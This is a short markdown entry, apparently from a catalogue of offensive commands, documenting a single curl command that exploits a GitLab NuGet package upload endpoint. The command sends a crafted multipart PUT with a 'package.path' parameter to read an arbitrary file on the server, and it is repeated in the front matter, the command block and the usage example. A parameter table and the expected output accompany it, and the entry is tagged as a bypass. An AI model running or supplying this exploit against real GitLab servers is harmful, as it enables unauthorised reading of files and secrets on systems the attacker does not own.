---
data: >-
  curl -XPUT -v -F '[package]=@/tmp/lala.txt'
  "http://vakzz:$TOKEN@gitlab-vm.local/api/v4/projects/171/packages/nuget/?package.path=/tmp/ggg"
tags:
  - http
  - bypass
type: command
executor: bash
platforms:
  - Linux
id: c7681447-4a02-4b09-8ef2-5cfba00f3e86
created_at: '2025-12-11T06:10:15.412Z'
updated_at: '2025-12-11T06:10:15.412Z'
verified: false
validated: true
submitted: true
---
# curl-nuget-upload-bypass

## Command

```bash
curl -XPUT -v -F '[package]=@/tmp/lala.txt' "http://vakzz:$TOKEN@gitlab-vm.local/api/v4/projects/171/packages/nuget/?package.path=/tmp/ggg"
```

## Description

Performs a PUT request to GitLab NuGet API with crafted multipart to bypass and read /tmp/ggg.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-XPUT` | HTTP PUT method | Yes |
| `-v` | Verbose output | No |
| `-F '[package]=@/tmp/lala.txt'` | Multipart form field | Yes |
| `?package.path=/tmp/ggg` | Path to read | Yes |

## Examples

### Basic Usage

```bash
curl -XPUT -v -F '[package]=@/tmp/lala.txt' "http://vakzz:$TOKEN@gitlab-vm.local/api/v4/projects/171/packages/nuget/?package.path=/tmp/ggg"
```

## Expected Output

{"message":"201 Created"} with file contents in response.

## Related

- [[procedures/Exploit-NuGet-Package-Upload-for-File-Read-Bypass]]
